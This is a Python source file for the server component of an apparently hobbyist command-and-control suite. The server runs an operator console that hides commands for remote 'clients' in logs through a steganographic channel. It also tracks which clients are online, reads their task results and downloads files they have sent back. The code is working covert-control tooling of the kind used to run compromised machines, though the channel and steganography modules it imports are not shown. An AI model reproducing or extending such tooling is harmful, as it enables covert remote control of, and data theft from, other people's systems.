import os.path
import time
import sys

from ccsuite.ccchanel.ccchanel_base import CCChanelBase
from ccsuite.ccchanel.ccchanel_log import log_append as cclog_append
from ccsuite.ccchanel.ccchanel_log import log_read as cclog_read
from ccsuite.ccchanel import ccchanel_messages as scmd
from ccsuite.server import repl_utils as srepl
from ccsuite.server import server_utils as sutil
from ccsuite.steno.steno_base import CCStenoBase


class CCServer(object):
    def __init__(self,
                 ccchanel: CCChanelBase,
                 steno_: CCStenoBase,
                 input_stream=sys.stdin,
                 log_root_dir='/tmp/ccsuite',
                 download_dir='/tmp/ccsuite'):
        self.ccchanel = ccchanel
        self.steno_base = steno_
        self.log_root_dir = log_root_dir
        self.download_dir = download_dir
        self.exit_flag = False
        self.input_stream = input_stream

    def log_append(self, client_id, payload):
        path = os.path.join(self.log_root_dir, client_id)
        return cclog_append(self.ccchanel, path, payload, self.steno_base)

    def log_read(self, client_id):
        path = os.path.join(self.log_root_dir, client_id)
        return cclog_read(self.ccchanel, path, self.steno_base)

    def dispatch_command(self, path, command, *args):
        payload = scmd.message_create_command(command, *args)
        self.log_append(path, payload)

    def download_file_as(self, remote_name, name):
        remote_path = os.path.join(self.log_root_dir, remote_name)
        bytes_ = self.ccchanel.read(remote_path)
        local_path = os.path.join(self.download_dir, name)
        with open(local_path, 'wb') as fp:
            fp.write(bytes_)

    def handle_local_command(self, command, *args):
        match command:
            case 'get':
                self.download_file_as(args[0], args[0])
            case 'cat':
                log = self.log_read(args[0])
                print(f"SERVER: cating {args[0]}")
                print(log)
            case 'online':
                file_list = self.ccchanel.list(self.log_root_dir)
                hosts = []
                for client_id in file_list:
                    log = self.log_read(client_id)
                    if log is not None and sutil.is_online(log):
                        hosts.append(client_id)
                print(f"SERVER: listing online clients")
                print(hosts)
            case 'result':
                log = self.log_read(args[0])
                if log is not None:
                    task_id = int(args[1])
                    result = sutil.get_done_with_id(log, task_id)
                    print(f"SERVER: result of task {task_id}: {result}")
                else:
                    print(f"SERVER: no log for {args[0]}")
            case _:
                pass

    def run(self):
        print(sutil.help_string())
        while not self.exit_flag:
            parsed_cmd = srepl.parse_command(self.input_stream)
            cmd_payload = parsed_cmd['payload']
            match parsed_cmd['kind']:
                case 'remote':
                    self.dispatch_command(cmd_payload['target'], cmd_payload['command'], *cmd_payload['args'])
                case 'local':
                    self.handle_local_command(cmd_payload['command'], *cmd_payload['args'])
                case 'exit':
                    self.exit_flag = True
                case 'fail':
                    print(sutil.help_string())
            time.sleep(
                1)  # Limit 1 cmd per second, so I dont have to deal with ids xD (timestamp is also id, cuz its easy)
